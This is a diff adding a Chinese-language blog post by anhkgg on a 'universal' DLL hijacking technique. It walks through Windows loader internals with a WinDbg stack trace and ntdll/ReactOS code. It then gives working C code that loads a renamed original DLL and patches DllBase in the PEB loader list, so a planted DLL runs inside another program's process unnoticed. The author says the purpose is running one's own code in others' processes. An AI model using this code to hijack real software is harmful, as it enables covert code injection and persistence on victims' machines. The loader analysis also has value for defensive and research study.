@@ -1,0 +1,351 @@
+>通用DLL劫持技术研究
+
+>by anhkgg
+
+>2018年11月29日
+
+## 写在前面
+
+Dll劫持相信大家都不陌生，理论就不多说了。Dll劫持的目的一般都是为了自己的dll模块能够在别人进程中运行，然后做些不可描述的事情。
+
+为了让别人的程序能够正常运行，通常都需要在自己的dll中导出和劫持的目标dll相同的函数接口，然后在自己的接口函数中调用原始dll的函数，如此使得原始dll的功能能够正常被使用。导出接口可以自己手工写，也可以通过工具自动生成，比如著名的`Aheadlib`。这种方法的缺点就是针对不同的dll需要导出不同的接口，虽然有工具帮助，但也有限制，比如不支持x64。
+
+除此之外，很早之前就知道一种通用dll劫持的方法，原理大致是在自己的dll的dllmian中加载被劫持dll，然后修改loadlibrary的返回值为被劫持dll加载后的模块句柄。这种方式就是自己的dll不用导出和被劫持dll相同的函数接口，使用更加方便，也更加通用。
+
+下面就尝试分析一下如何实现这种通用的dll劫持方法。
+
+## 原理分析
+
+随便写一个测试代码：
+
+    
+    
+    //mydll.dll 伪造的用于劫持mydll.dll的dll代码
+    
+    //mydll.dll.1是把test.exe加载的原始dll修改为这个名字
+    
+    BOOL APIENTRY DllMain( HMODULE hModule,
+    
+    DWORD ul_reason_for_call,
+    
+    LPVOID lpReserved
+    
+    )
+    
+    {
+    
+    switch (ul_reason_for_call)
+    
+    {
+    
+    case DLL_PROCESS_ATTACH:
+    
+    __debugbreak();
+    
+    HMODULE hmod = LoadLibraryW("mydll.dll.1");
+    
+    case DLL_THREAD_ATTACH:
+    
+    case DLL_THREAD_DETACH:
+    
+    case DLL_PROCESS_DETACH:
+    
+    break;
+    
+    }
+    
+    return TRUE;
+    
+    }
+    
+    //test.exe
+    
+    void main()
+    
+    {
+    
+    LoadLibraryW(L"mydll.dll");
+    
+    }
+    
+
+用windbg加载看看堆栈，如下所示。在test中通过LoadLibraryW加载mydll.dll，最后进入mydll!DllMain。现在需要分析系统映射dll之后是如何把基地址返回给LoadLibraryW，然后才能想办法把这个值给修改成加载mydll.dll.1的值。
+
+    
+    
+    0:000> kvn
+    
+    # ChildEBP RetAddr Args to Child
+    
+    WARNING: Stack unwind information not available. Following frames may be wrong.
+    
+    00 0025eaf8 6e4112ec 6e410000 00000000 00000000 mydll+0x101d
+    
+    01 0025eb38 6e4113c9 6e410000 00000001 00000000 mydll+0x12ec
+    
+    02 0025eb4c 77d889d8 6e410000 00000001 00000000 mydll!DllMain+0x13
+    
+    03 0025eb6c 77d95c41 6e4113ad 6e410000 00000001 ntdll!LdrpCallInitRoutine+0x14
+    
+    04 0025ec60 77d9052e 00000000 74e92d11 77d77c9a ntdll!LdrpRunInitializeRoutines+0x26f (FPO: [Non-Fpo])
+    
+    05 0025edcc 77d9232c 0025ee2c 0025edf8 00000000 ntdll!LdrpLoadDll+0x4d1 (FPO: [Non-Fpo])
+    
+    06 0025ee00 75ee88ee 0037429c 0025ee40 0025ee2c ntdll!LdrLoadDll+0x92 (FPO: [Non-Fpo])
+    
+    07 0025ee38 761b3c12 00000000 00000000 00000001 KERNELBASE!LoadLibraryExW+0x15a (FPO: [Non-Fpo])
+    
+    08 0025ee4c 6848e3f5 0025ee58 003a0043 0055005c kernel32!LoadLibraryW+0x11 (FPO: [Non-Fpo])
+    
+    09 0025f068 6848d1de d9131536 00000000 00000000 test!start+0x2b5
+    
+    0a 0025f09c 6848e245 013a0000 761b3c26 76b3ea5f test!start+0x21e86e
+    
+    0b 0025f328 013a1918 013a0000 0037187a 00000000 test!start+0x105
+    
+    0c 0025fb44 013a30b9 013a0000 00000000 0037187a test+0x1918
+    
+    0d 0025fb90 761b3c45 7ffd9000 0025fbdc 77d937f5 test+0x30b9
+    
+    0e 0025fb9c 77d937f5 7ffd9000 74e93b01 00000000 kernel32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo])
+    
+    0f 0025fbdc 77d937c8 013a312b 7ffd9000 00000000 ntdll!__RtlUserThreadStart+0x70 (FPO: [Non-Fpo])
+    
+    10 0025fbf4 00000000 013a312b 7ffd9000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
+    
+
+先去reactos翻看一下，找到如下的函数调用结构。在LdrLoadDll参数中BaseAddress就是最后返回给LoadLibraryW的值，所以继续看BaseAddress是如何赋值的。BaseAddress继续传给LdrpLoadDll，在LdrpLoadDll中，首先通过LdrpMapDll映射dll模块，返回一个LdrEntry的LDR_DATA_TABLE_ENTRY结构，保存了dll加载的基址、大小、名字等信息。接着LdrEntry会插入到peb->ldr链表结构中，然后调用LdrpRunInitializeRoutines，在LdrpRunInitializeRoutines中最终会调用DllMain，此处不继续深入分析。最后LdrEntry->DllBase赋值给BaseAddress。到此流程分析清楚，下面考虑如何修改这个值。
+
+    
+    
+    NTSTATUS
+    
+    NTAPI
+    
+    LdrLoadDll(IN PWSTR SearchPath OPTIONAL,
+    
+    IN PULONG DllCharacteristics OPTIONAL,
+    
+    IN PUNICODE_STRING DllName,
+    
+    OUT PVOID *BaseAddress) {
+    
+    Status = LdrpLoadDll(RedirectedDll,
+    
+    SearchPath,
+    
+    DllCharacteristics,
+    
+    DllName,
+    
+    BaseAddress,
+    
+    TRUE);
+    
+    }
+    
+    NTSTATUS
+    
+    NTAPI
+    
+    LdrpLoadDll(IN BOOLEAN Redirected,
+    
+    IN PWSTR DllPath OPTIONAL,
+    
+    IN PULONG DllCharacteristics OPTIONAL,
+    
+    IN PUNICODE_STRING DllName,
+    
+    OUT PVOID *BaseAddress,
+    
+    IN BOOLEAN CallInit)
+    
+    {
+    
+    Status = LdrpMapDll(DllPath,
+    
+    DllPath,
+    
+    NameBuffer,
+    
+    DllCharacteristics,
+    
+    FALSE,
+    
+    Redirected,
+    
+    &LdrEntry);
+    
+    //插入peb->ldr链表
+    
+    Status = LdrpRunInitializeRoutines(NULL);
+    
+    if (NT_SUCCESS(Status))
+    
+    {
+    
+    /* Return the base address */
+    
+    *BaseAddress = LdrEntry->DllBase;
+    
+    }
+    
+    }
+    
+    LdrpRunInitializeRoutines-> LdrpCallInitRoutine -> DllMain
+    
+
+记得映像中的那种方法，是通过堆栈回溯到LdrpLoadDll中，找到LdrEntry进行修改（不确实是否准备，时间久远了），但因为LdrEntry是局部变量，不同系统可以不一样，兼容性差一些。但看到这个调用流程之后，其实还有另一种方式。LdrEntry->DllBase赋值给BaseAddress，那么在赋值之前把这个LdrEntry->DllBase修改了即可，在DllMain正好是修改的时机，但是不需要使用堆栈回溯的方式。因为LdrEntry已经插入到peb->ldr中，那么在DllMain中可以直接获取peb->ldr遍历链表找到目标dll堆栈的LdrEntry就是需要修改的LdrEntry，然后修改即可。
+
+不过这个分析都是基于reactos来的，还是需要确认一下真是windows系统的ntdll是如何首先的。
+
+在win7
+x64系统中，ntdll的关键代码如下所示。差别是LdrpLoadDll直接返回的ldrentry，而不是BaseAddress，在LdrpLoadDll内部流程基本和reactos一致。所以方案应该可行，后续验证确实证明可行。
+
+    
+    
+    int __fastcall LdrLoadDll()
+    
+    {
+    
+    v11 = LdrpLoadDll(v5, v9, v10, 1, 0i64, &dataentry);
+    
+    v12 = v11;
+    
+    if ( v11 >= 0 )
+    
+    *dllbase = dataentry->DllBase;
+    
+    }
+    
+
+## 尝试实现
+
+实现其实非常简单，关键代码如下所示。两部分代码，一个是加载原始dll模块（mydll.dll.1）拿到真是的模块句柄hMod（基地址），第二个就是遍历peb->ldr找到mydll.dll的ldrentry，然后修改dllbase为hMod。
+
+    
+    
+    void* NtCurrentPeb()
+    
+    {
+    
+        __asm {
+    
+            mov eax, fs:[0x30];
+    
+        }
+    
+    }
+    
+    PEB_LDR_DATA* NtGetPebLdr(void* peb)
+    
+    {
+    
+        __asm {
+    
+            mov eax, peb;
+    
+            mov eax, [eax + 0xc];
+    
+        }
+    
+    }
+    
+    VOID SuperDllHijack(LPCWSTR dllname, HMODULE hMod)
+    
+    {
+    
+        WCHAR wszDllName[100] = { 0 };
+    
+        void* peb = NtCurrentPeb();
+    
+        PEB_LDR_DATA* ldr = NtGetPebLdr(peb);
+    
+        for (LIST_ENTRY* entry = ldr->InLoadOrderModuleList.Blink;
+    
+            entry != (LIST_ENTRY*)(&ldr->InLoadOrderModuleList);
+    
+            entry = entry->Blink) {
+    
+            PLDR_DATA_TABLE_ENTRY data = (PLDR_DATA_TABLE_ENTRY)entry;
+    
+            memset(wszDllName, 0, 100 * 2);
+    
+            memcpy(wszDllName, data->BaseDllName.Buffer, data->BaseDllName.Length);
+    
+            if (!_wcsicmp(wszDllName, dllname)) {
+    
+                data->DllBase = hMod;
+    
+                break;
+    
+            }
+    
+        }
+    
+    }
+    
+    VOID DllHijack(HMODULE hMod)
+    
+    {
+    
+        TCHAR tszDllPath[MAX_PATH] = { 0 };
+    
+        GetModuleFileName(hMod, tszDllPath, MAX_PATH);
+    
+        PathRemoveFileSpec(tszDllPath);
+    
+        PathAppend(tszDllPath, TEXT("mydll.dll.1"));
+    
+        HMODULE hMod1 = LoadLibrary(tszDllPath);
+    
+        SuperDllHijack(L"mydll.dll", hMod1);
+    
+    }
+    
+    BOOL APIENTRY DllMain( HMODULE hModule,
+    
+    DWORD ul_reason_for_call,
+    
+    LPVOID lpReserved
+    
+    )
+    
+    {
+    
+    switch (ul_reason_for_call)
+    
+    {
+    
+    case DLL_PROCESS_ATTACH:
+    
+    DllHijack(hModule);
+    
+    break;
+    
+    case DLL_THREAD_ATTACH:
+    
+    case DLL_THREAD_DETACH:
+    
+    case DLL_PROCESS_DETACH:
+    
+    break;
+    
+    }
+    
+    return TRUE;
+    
+    }
+    
+
+## 总结
+
+经测试在win7 x84和win10 x64中即是有效的，其他系统未测试，如果有问题，请留言或自行解决。
+
+害怕这种方案不行，还想了另一种思路，在dllmain中hook
+LdrpLoadDll的返回调用地址处，修改dataentry的值，因为LdrLoadDll函数接口固定，所以这种方式也应该是通用的，不过实现起来其实还比现在的麻烦些，所以只是保留了这种思路，并未去实现验证，留给爱折腾的朋友吧。
+
+最后，代码上传了github，<https://github.com/anhkgg/SuperDllHijack>
+
+**广告：欢迎关注公众号汉客儿或QQ群（753894145），一起交流学习**  
+
